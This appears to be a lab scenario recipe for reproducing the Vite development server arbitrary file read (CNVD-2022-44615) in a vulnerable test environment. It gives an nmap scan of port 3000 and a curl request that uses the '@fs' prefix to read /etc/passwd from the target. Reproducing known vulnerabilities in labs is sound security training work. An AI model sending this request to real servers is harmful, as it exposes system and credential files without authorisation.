access_instructions:
  title: Vite Development Server Arbitrary File Read (CNVD-2022-44615)
  steps:
  - title: Locate the target service
    instructions: |-
      Catalog TCP ports: 3000. Identify the exposed services:

      ```bash
      nmap -Pn -sT -sV -p 3000 {{NODE_IP}}
      ```

      Catalog port mappings (published → container): web: 3000/tcp → container 3000/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.

      Documented target URL(s): `http://{{NODE_IP}}:3000`, `http://{{NODE_IP}}:3000/`.
  - title: Vulnerability Reproduction
    instructions: |-
      You can read arbitrary files on the filesystem by using the standard `@fs` prefix:

      ```bash
      curl "http://{{NODE_IP}}:3000/@fs/etc/passwd"
      ```

      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/vite/CNVD-2022-44615/1.png
